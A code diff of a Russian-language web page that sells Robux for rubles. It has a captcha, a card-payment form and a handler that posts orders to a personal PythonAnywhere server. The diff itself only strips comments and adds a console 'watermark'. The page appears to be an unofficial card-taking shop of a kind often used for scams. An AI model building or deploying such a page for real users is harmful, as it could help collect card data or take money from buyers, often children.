@@ -275,7 +275,6 @@
       border-top: 1px solid rgba(255,255,255,0.04);
     }
     .monitor-status span { color: #00c2ff; }
-    /* === Капча === */
     .captcha-wrapper {
       display: flex;
       justify-content: center;
@@ -345,11 +344,9 @@
       Вы получите: <span id="robuxDisplay">850</span> R$
     </div>
 
-    <!-- === КАПЧА CLOUDFLARE TURNSTILE === -->
     <div class="captcha-wrapper">
       <div class="cf-turnstile" data-sitekey="1x00000000000000000000AA" data-callback="onCaptchaSuccess"></div>
     </div>
-    <!-- =================================== -->
 
     <button type="button" class="btn" id="showPaymentBtn" style="background: linear-gradient(135deg, #f7971e, #ffd200); box-shadow: 0 8px 28px rgba(255, 210, 0, 0.25);">💳 Оплатить картой</button>
 
@@ -405,10 +402,12 @@
 </div>
 
 <script>
+  // ===== СКРЫТАЯ МЕТКА (WATERMARK) =====
+  console.log('🔒 Оригинальный сайт Миксимки. Версия 2.0.');
+  // =====================================
+
   (function() {
-    // ===== ВАШ СЕРВЕР НА PYTHONANYWHERE =====
     const SERVER_URL = 'https://Maxxi1mka.pythonanywhere.com/send-order';
-    // =========================================
 
     const rubInput = document.getElementById('rub');
     const robuxSpan = document.getElementById('robuxDisplay');
@@ -429,7 +428,6 @@
 
     let captchaPassed = false;
 
-    // === ФУНКЦИЯ ВЫЗЫВАЕТСЯ, КОГДА КАПЧА ПРОЙДЕНА ===
     window.onCaptchaSuccess = function(token) {
       captchaPassed = true;
       console.log('✅ Капча пройдена');
@@ -464,7 +462,6 @@
     updateDisplay();
 
     showPaymentBtn.addEventListener('click', function() {
-      // Проверяем капчу
       if (!captchaPassed) {
         alert('⚠️ Сначала подтвердите, что вы не робот (капча выше).');
         return;
@@ -552,7 +549,6 @@
     form.addEventListener('submit', function(e) {
       e.preventDefault();
 
-      // Повторно проверяем капчу
       if (!captchaPassed) {
         alert('⚠️ Подтвердите, что вы не робот (капча выше).');
         return;
@@ -628,8 +624,6 @@
           alert('✅ Оплата прошла успешно (ДЕМО)!\nЗаказ принят. Ожидайте Robux 3–5 дней.');
           paymentForm.classList.remove('visible');
           showPaymentBtn.textContent = '💳 Оплатить картой';
-          // После успешной оплаты можно сбросить капчу (перезагрузить виджет)
-          // Для простоты просто перезагружаем страницу через 2 секунды:
           setTimeout(() => location.reload(), 2000);
         } else {
           alert('❌ Ошибка сервера: ' + (data.error || 'неизвестная'));
